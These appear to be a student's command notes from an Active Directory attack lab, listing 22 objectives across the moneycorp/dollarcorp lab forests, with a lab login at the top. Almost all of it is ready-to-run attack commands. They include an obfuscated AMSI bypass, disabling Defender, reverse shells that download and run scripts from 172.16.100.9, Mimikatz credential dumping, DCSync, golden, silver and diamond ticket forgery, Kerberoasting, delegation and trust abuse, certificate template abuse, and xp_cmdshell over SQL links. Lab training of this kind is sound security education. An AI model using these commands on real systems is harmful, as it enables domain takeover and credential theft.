student309
password: fH9rDmdjIVBBhwJQwio8

Learning Objective 1:
....................
Tasks
Enumerate followinf for dollarcorp domain
-Users
-Computers
-Domain Administrator
-Enterprise Admins


Commands:

#CMD
cd C:\AD\Tools
$Run InviShell Script to avoid enhance logging
C:\AD\Tools\Invishell\RunwithRegistryNonAdmin.bat
2load PowerView.ps1 in session
. C:\AD\Tools\PowerView.ps1

#Enumerate Domain User
Get-DomainUser

#To list only samaccountname
Get-DomainUser | select -ExpandProperty samaccountname

# To enumerate member computer
Get-DomainComputer | select -ExpandProperty dnshostname

#To get details Domain Admins Group
Get-DomainGroup -Identity "Domain Admins"

#To enumerate members of the Domain Admin Group
Get-NetDomainGroupMember -Identity "Domain Admins"

#To enumerate mebers of Enterprise Admin Group
 Get-DomainGroupMember -Identity "Enterprise Admins" -Domain
moneycorp.local

Learning Objective 2
....................
Task 
Enumerate followinf for dcorp domain:
-List all the OUS
-List all the computers in StudentMachines OU
-List the GPOs
-Enumerate GPO applied on StudentMachines OU.

Commands:
#To list all the OUs
Get-DomainOU

#To see only names of OU
Get-DomainOU | select -ExpandProperty name

#To list all the computers in Student Machines OU
(Get-DomainOU -Identity StudentMachines).distinguishedname |
%{Get-DomainComputer -SearchBase $_} | select name

#To list the GPOs
Get-DomainGPO

#To Enumerate GPO applied on StudentMachines OU
(Get-DomainOU -Identity  StudentMachines).gplink
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-
9E4618BC785D}'

Learning Objective 3
....................

Task
> Enumerate following on dollarcorp domain
 -ACL of Domain Admins Group
 -All modify rights/permissons for the studentx

Commands:

# Enumerate ACls of Domain Admins Group
Get-ObjectAcl -Identity "Domain Admin" -ResolveGUIDs -Verbose

# To check for modify permission/rihgts for studentx
Find-InteretsingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 
"student2"}

# To check for modify rights/permissions for RDPUsers
 Find-InteretsingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 
"RDPUsers"}

Learning Objective 4
....................
Tasks
 -Enumerate all the Domains in moneycorp.local forest
 -Map the trust of dollarcorp.moneycorp.local domain
 -Map external trust in moneycorp.local forest
 -Identify external trusts of dollarcorp domain. Can you enumerate forest for the trusting forest?

Commands:

# To enumerate all domains in curent forest
Get-ForestDomain -Verbose

# To map all the trust of dollarcorp domain
 Get-DomainTrust

# To list only external trust in moneycorp.local forest
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |
?{$_.TrustAttributes -eq "FILTER_SIDS"}

# To identify external trust of dollarcorp domain
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

# To enumerate trust for eurocorp.local domain 
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -
Domain $_.Name}

Learning Objective 5
....................

Tasks
 -Exploit a service on dollarcorp-studentx and elevate privilages to local administrator
 -Identify a machine in a domain where studentx has local administrative access
 -Using privilages of a user jenkins on 172.16.3.11:8080; get admin privileges on 172.16.3.11 -the dcorp-ci server

Command
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
# Load PowerUp
. C:\AD\Tools\PowerUp.ps1

# Enumerate
Invoke-AllChecks

# Abuse and add our domain user to local administrator group
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName
'dcorp\studentx' -Verbose

# Now, Just log off and log on again we have local admin privileges


- Identify local admin privs on other machine

# load Find-PSRemotionLocalAdminAccess.ps1 
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1


# Hunt for local admin privilegs
Find-PSRemotingLocalAdminAccess

We can connect to dcorp admin using winrs as student user:
winrs -r:dcorp-adminsrv cmd
whoami
hostname

# local admin on dcorp-ci
 http://172.16.3.1:8080/
 builduser\builduser

powershell iex (iwr http://172.16.100.9/Invoke-PowerShellTcp.ps1) ;Power -Reverse -IPAddress 172.16.100.9 -Port 443

# Host reverse shell on local server and disbale firewall

# Start the listiner
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

Learning Objective 6
....................

Tasks
  -Setup bloodhound and identify the shortest path to domain admins in dollarcorp domain

Commands
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-
4.4.5\bin>
# Install neo4j service
neo4j.bat install-service

# Start neo4j
 neo4j.bat start

# Browse 
 http://localhost:7474

# Update Password
  Username: neo4j
  Password: BloodHound

# Open BloodHound
 C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
  Username: neo4j
  Password: BloodHound

# C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
cd C:\AD\Tools\bloodhound-master\bloodhound-master\Collectors\

#Bypass amsi
 . .\SharpHound.ps1
Invoke-BloodHound -CollectioMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose

Learning Objective 7
*********************

Tasks
 Identify a machine in the target domain where a Domain Admin session is available.
• Compromise the machine and escalate privileges to Domain Admin
− Using access to dcorp-ci
− Using derivative local admin
 
 ..Part 1..

# Reverse Shell on Dcorp-ci (By abusing Jenkins)
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

# To use PowerView obfuscate it or bypass amsii
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)

S`eT-It`em ( 'V'+'aR'
+ 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) )
; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'
s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )

iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))

# Run(Take some time)
Find-DomainUserLocation

# check if we can execute commands on dcorp-mgmt
winrs -r:dcorp-mgmt hostname;whoami

# Download Loader.exe on dcorp-ci
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

# copy Loader.exe to dcorp-mgmt
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

# add port-fowarding
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

# load and execute safetykatz on dcorp-mgmt
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

# Using elevated shell from student vm
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

..Part 2..

#CMD
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

#Hunt for Local Admin Access
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose


#Find out the applocker is on
Enter-PSSession dcorp adminsrv 

#Connect with adminsrv using winrs
winrs -r:dcorp-adminsrv cmd

#Enumerate Applocker
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

#Permissive Policy
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

#Using Powershell remoting too
Enter-PSSession dcorp-adminsrv
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#disable defender on dcorp-adminsrv
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose

#On local machine modify invoke-mimi to include function call (Invoke-Mimi -Command '"sekurlsa::ekeys"') and copy it to target
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

cd 'C:\Program Files\'
.\Invoke-MimiEx.ps1

# Using elevated shell from studnet Vm
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
/run:cmd.exe" "exit"

# In new processa s srvadmin
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose

# In the new process running as srvadmin copy Loader.exe to dcorp-mgmt
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
winrs -r:dcorp-mgmt cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

# on local Machine
 C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
/opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


Learning Objective 8
*********************

Tasks
  Extract secrets from the domain controller of dollarcorp.
• Using the secrets of krbtgt account, create a Golden ticket.
• Use the Golden ticket to (once again) get domain admin privileges from a machine

Commands

C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
/opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

lsadump::lsa /patch

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync/user:dcorp\krbtgt" "exit"

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
/startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

Learning Objective 9
*********************


Learning Objective 10:
*********************

Tasks
Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.

Commands 
£ Run below the following command in elevated shell(Run as administrator)

C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe
/show /ptt

Access the DC using winrs from the new spawned process!
winrs -r:dcorp-dc cmd
whoami

Learning Objective 11
*********************

Tasks
  -Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

Commands
   # Open a Shell with Domain Admin Privileges
 
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# with DA privileges
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
$sess = New-PSSession dcorp-dc
Enter-PSSession -Session $sess

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

exit
# Load Invoke-Mimi.ps1 to Session
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
Enter-PSSession -Session $sess

# Extract the credentials from the SAM file from DC
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'

# Change the logon behaviour of account by modifying registry on DC

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD

# On local Machine Just pass the Hash for DSRM administrator

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

. C:\AD\Tools\Invoke-Mimi.ps1

Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

# In the new Session

ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

Learning Objective 12
*********************

Tasks
  -Check if studentx has Replication (DCSync) rights.
• If yes, execute the DCSync attack to pull hashes of the krbtgt user.
• If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of
the krbtgt user.

Commands
 
# Check if the student2 has replication rights
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1

Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student2"}

# With DA
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc701 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Add the Replication Rights to student 2
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student2 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Check For Replication Rights Once Again For normal shell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student2"}

# As normal User from elevated shell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

Learning Objective 13
*********************

Tasks
# Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI
without requiring administrator access.
# Retrieve machine account hash from dcorp-dc without using administrator access and use that
to execute a Silver Ticket attack to get code execution with WMI.

Commands
# Modify the host Security Descriptor on WMI on the DC (With DA)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Race.ps1
Set-RemoteWMI -SamAccountName student2 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

# As normal user 
gwmi -class win32_operatingsystem -ComputerName dcorp-dc

# Similar Modification can be done to PowerShell Remoting configration (With DA)
Set-RemotePSRemoting -SamAccountName student2 -ComputerName dcorp-dc -Verbose

# As normal user
Invoke-Command -ScriptBlock{whoami} -ComputerNmae dcorp-dc

# modify Permission on Dc to retrive machine account hash
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student2 -Verbose

# As normal User
. C:\AD\Tools\Race.ps1
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

create a silver ticket for host service
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

create a silver ticket RPCSS
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

Learning Objective 14
*******************

Tasks
  Using the Kerberoast attack, crack password of a SQL server service account.

Commands
# Find Out services running with user account
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-NetUser -SPN

# use Rubeus to get hashes for the svcadmin

C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt 

# remove ":1433" from the SPN in hashes.txt

# Use john the ripper to brute-force the hashes

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt 

Learning Objective 15
*********************

Tasks
  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
• Compromise the server and escalate to Domain Admin privileges.
• Escalate to Enterprise Admins privileges by abusing Printer Bug!

Commands

# Find a sever in dcorp domain where unconstrained delegation is enabled

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Try enumeration as appadmin to see if has local admin on dcorp-appsrv
# Run from the elevated process

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"

# In the new process
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

# Copy Rubeus on dcorp-appsrv using xcopy and execute with winrs
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
winrs -r:dcorp-appsrv cmd
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

# on student machine
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# On the Rubeus listiner we can see the TGT of dcorp-dc$
# Copy the base64 encoded ticket and use it with Rubeus on student vm. Run below command from elevated shell
C:\AD\Tools\Rubeus.exe ptt /ticket:doIFx…

Learning Objective 16
*********************

Tasks
Enumerate users in the domain for whom Constrained Delegation is enabled.
− For such a user, request a TGT from the DC and obtain a TGS for the service to which
delegation is configured.
− Pass the ticket and access the service.

• Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
− For such a user, request a TGT from the DC.
− Obtain an alternate TGS for LDAP service on the target machine.
− Use the TGS for executing DCSync attack.

Commands
 # Enumerate users with constrained delegation using PowerView
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth

# Request to get the TGS for websv asthe Domain Administrator
# We already have hashes of dcorp-adminsrv account - 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

# Check if TGT is genertated 
klist

# Accessing file system on dcorp-mssql
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# enumerate the computer accounts with constrained delegation using PowerView
Get-DomainComputer -TrustedToAuth

# Abuse constrained elegation using dcorp-adminsrv with Rubeus ( run from elevated shell)
# We already have the Aes keys of dcorp-adminsrv
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

# Run DCsync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

Learning Objective 17
*********************

Tasks
Find a computer object in dcorp domain where we have Write permissions.
Abuse the Write permissions to access that computer as Domain Admin.

Commands
# Enumerate write permissions for a user that we have compromised on the computer object of dcorp-mgmt
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

# we already have a reverse shell from dcorp-ci as ciadmin
# Load PowerView on reverse shell as ciadmin
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-student1$ /aes256:79b8e7b089ec5fb15ef481783d9b335223d2786923c1d8e6f6032d9527ae99f8 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd

Learning Objective 18:
*********************

Tasks
Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to
the parent domain, moneycorp.local using the domain trust key.

Commands
# Start a Process withDA privileges (from elevated shell)
C:\AD\Tools\Rubeus.exe asktgt /user:svadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#As DA
# copy loader.exe
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.9
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
lsadump::trust /patch

# Forge a Ticket SID gistory of Enterprise Admin
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:132f54e05f7c3db02e97c00ff3879067 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

# Use the ticket with Rubeus
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# check if we can access file system on dcorp.moneycorp.local
dir \\mcorp-dc.moneycorp.local\c$

Learning Objective 19
*********************

Tasks
Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to
the parent domain, moneycorp.local using dollarcorp's krbtgt hash

Commands
# We already have the krbtgt hash from dcorp-dc lets create inter-realm tgt and inject (from elevated process)
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# Check if we can access mcorp-dc
dir \\mcorp-dc.moneycorp.local\c$

# Run DCSync against mcorp-dc to extract credentials
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

# Extract Administrator hash
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local" "exit"

# get interactive access on mcorp-dc
C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp-dc.moneycorp.local /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# In the new process
winrs -r:mcorp-dc whoami

Learning Objective 20
*********************

Tasks
With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the
DC of eurocorp.local forest.

Commands
# Start a process with DA privileges
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# As DA privileges
# Copy loader
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.9

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
extract Trust keys
lsadump::trust /patch

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:7ac67e98344158d9a5edd6080a998a59 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"

# Use the ticket with Rubeus
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

# Check if we can access shared resources eurocorp.local
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt

Learning Objective 21
*********************
Tasks
Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.

Commands
Certify Tool to check for AD CS in moneycorp
Find DAs
C:\AD\Tools\Certify.exe cas

we can request a certificate fro any user in template that allow enrollment for normal or low privliged users
Request a certificate for any user using CA-Integration template for DA
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator

C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc6-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc6-DA.pfx

C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc6-DA.pfx /password:SecretPass@123 /ptt

Learning Objective 22
*********************

Tasks
Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-
mssql.

Commands
Enumerating SQL server iin the dcorp domain and checking if student2 has privileges to connect to any of them
cd AD\Tools
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1

Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose   

# Use Get-SQLServerLinkCrawl for crwling the database links automatically
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose

# It is possible to execute commands on eu-sql using linked database
# Executing whoami command on eu-sql
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" 

# start a listener
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

# Get a reverse shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.9/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.9/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.9/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql